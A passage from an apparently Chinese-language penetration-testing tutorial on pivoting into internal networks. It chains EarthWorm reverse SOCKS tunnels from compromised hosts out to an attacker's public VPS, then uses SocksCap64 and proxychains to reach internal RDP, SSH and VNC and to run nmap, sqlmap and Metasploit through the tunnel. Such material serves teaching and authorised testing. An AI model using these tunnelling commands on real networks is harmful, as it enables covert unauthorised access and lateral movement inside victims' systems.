  1. 上传ew到右侧A主机，运行下列命令：
`ew -s lcx_tran -l 1080 -f 10.48.128.49 -g 888`
该命令意思是将1080端口收到的代理请求转交给B主机（10.48.128.49）的888端口。
  1. 可以通过访问A主机外网139.XXX.XX.113:1080来使用在B主机架设的socks5代理。
### **4\. 二级网络环境（二）**
假设我们获得了右侧A主机和B主机的控制权限，A主机没有公网IP，也无法访问内网资源。B主机可以访问内网资源，但无法访问外网。
这个操作分为4步，用到lcx_listen和lcx_slave命令：
  1. 先上传ew 到左侧公网VPS上，运行下列命令：
`ew –s lcx_listen –l 10800 –e 888`
该命令意思是在公网VPS添加转接隧道，将10800端口收到的代理请求转交给888端口。
  1. 上传ew到右侧B主机，并利用ssocksd方式启动999端口的socks代理，命令如下：
`ew -s ssocksd -l 999`
  1. 上传ew 到右侧A主机，运行下列命令：
`ew -s lcx_slave -d 139.XXX.XX.113 -e 888 -f 10.48.128.49 -g 999`
该命令意思是在A主机上利用lcx_slave方式，将公网VPS的888端口和B主机的999端口连接起来。
  1. 返回我们公网VPS的CMD界面下，可以看到已经连接成功了。
现在就可以通过访问公网VPS地址 139.XXX.XX.113:10800来使用在B主机架设的socks5代理。
### **5\. 三级网络环境**
三级网络环境在实际渗透中用的比较少，也比较复杂，现在我们来一个个的讲解下三级级联的用法。
假设渗透场景：右侧内网A主机没有公网IP但可以访问外网，B主机不能访问外网但可以被A主机访问、C主机可被B主机访问而且能够访问核心区域。
  1. 在左侧公网VPS上运行命令，将1080端口收到的代理请求转交给888端口：
`ew -s rcsocks -l 1080 -e 888`
  2. 在A主机上运行命令，将公网VPS的888端口和B主机的999端口连接起来：
`ew -s lcx_slave -d 139.XXX.XX.113 -e 888 -f 10.48.128.12 -g 999`
  3. 在B主机上运行命令，将999端口收到的代理请求转交给777端口：
`ew -s lcx_listen -l 999 -e 777`
  4. 在C主机上启动SOCKS V5服务，并反弹到B主机的777端口上，命令如下。
`ew -s rssocks -d 10.48.128.12 -e 777`
  5. 在MY PC上可以通过访问公网VPS 139.XXX.XX.113:1080来使用在C主机架设的socks5代理。
> **整个数据流向是：SOCKS V5 → 1080 → 888 →999 →777 → rssocks**
## 0×06 内网漫游
### **1.Windows下使用sockscap64**
首先下载安装好SocksCap64后，以管理员权限打开。默认浏览器已经添加。
使用比较简单，点击代理，点击添加一个代理，然后设置下代理服务器IP和端口就可以使用了。设置好后可以点击软件右边有个闪电的小圆点，测试下当前代理服务器是否可以连接，如下图，连接是正常的。
这个时候就可以选择浏览器，右击在代理隧道中运行选中的程序，然后我们就可以自由访问我们想访问的内网资源了，比如我们可以访问10.48.128.22路由的80端口，如下图：
可以看到我们已经成功的通过socks代理漫游内部网络WEB资源，我们接着看看还有哪些程序能够利用SOCKSCAP的程序通过代理访问内网中的哪些端口了？
尝试登陆10.48.128.20的3389端口，可以看到成功登陆。
我们可以在我们的公网VPS的命令行下可以看到，不停的有数据的交换。再尝试PUTTY访问10.48.128.49的22端口，成功登陆。
再试试VNC端口，因为10.48.128.25开了5900端口，OK，成功访问。大家可以看到这种利用SOCKS代理实现一对多端口映射的优势立刻就体现了出来，效率倍增。
但是将扫描工具进行SOCKSCAP代理，然后对内网网段进行扫描，我没有尝试成功，大家可以多多的尝试各种工具!我在代理下用扫描工具一般都是用proxychains，大家接着往下看！
### 2.LINUX下使用proxychains
KALI系统已经预装好了这个工具，我们稍作配置就可以使用，打开终端，输入命令：
​ vi /etc/proxychains.conf
> 顺便补充下LINUX下Vim编辑器简单使用方法
使用上面命令进入文本后，摁“i”键就进入了编辑模式，可以对文本进行修改，修改完后摁esc 然后摁住shift+； 左下角会出现一个冒号，如下图。
这个时候输入wq，摁回车保存并退出。
第一步先删掉dynamic_chain前面的注释符（也就是#符号），如下图
然后拉到最下面，把默认是socks4 127.0.0.1 9050 的地方改成我们架设的代理服务139.XXX.XX.113 1008
这样就设置完成了，我们接着测试下代理服务是否正常，在终端输入：
​ proxyresolv www.baidu.com
此时如上图所示会显示未找到命令，不要担心，继续在终端输入下列命令
​ cp /usr/lib/proxychains3/proxyresolv /usr/bin/
然后再次测试下代理服务器是否正常，如下图，显示OK就表示配置正确了。
现在我们就可以愉快的畅游内网了，照例先访问内网网站试试看，我们先在终端输入proxychains firefox启动火狐浏览器。
等个几秒钟，火狐就打开了，我们还是访问10.48.128.22路由的80端口看看。
顺利打开，可以看到kali里面的数据不停的交换，我们再打开10.48.128.48看看，也是可以访问的，一个Zend服务器测试页。
接着就到了我们的重头戏了，我们找几个具有代表性的工具试试，先看看NMAP和SQLMAP好使不!
如上图所示，均表示相当好使，我们最后再试试大杀器-Metasploit可不可以用。
我们随便找个IP扫扫看端口，如下图所示，已经开始扫描了。
其他工具就不再一一介绍了。